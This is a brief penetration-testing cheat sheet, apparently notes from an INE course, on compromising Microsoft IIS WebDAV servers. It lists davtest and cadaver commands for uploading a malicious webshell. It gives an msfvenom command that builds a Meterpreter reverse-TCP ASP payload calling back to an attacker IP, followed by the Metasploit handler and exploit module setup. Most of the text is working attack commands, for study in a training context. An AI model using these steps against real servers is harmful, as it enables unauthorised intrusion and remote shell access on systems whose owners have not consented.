# Windows Vunerabilities

## Microsoft ISS WebDAV
```
davtest -url [URL]
```
```
davtest -auth [USERNAME]:[PASSWORD] -url [URL]
```
```
cadaver [URL]
```
Once inside cadaver prompt:
```
put [MALICIOUS-WEBSHELL]
```
Now Check ISS WebDAV via internet browser to perform objectives...

### Metasploit
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -f asp > [FILENAME]
```
Now put payload on target machine by any means (cadaver works well, see command above)  

Next set up and start a listenr:  
```
service postgresql start && msfconsole
```
```
use multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
Set other required options and exploit

#### Automate the above process

```
use exploit/windows/iss/iss_webdav_upload_asp
```
Now set required options and exploit.  

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2
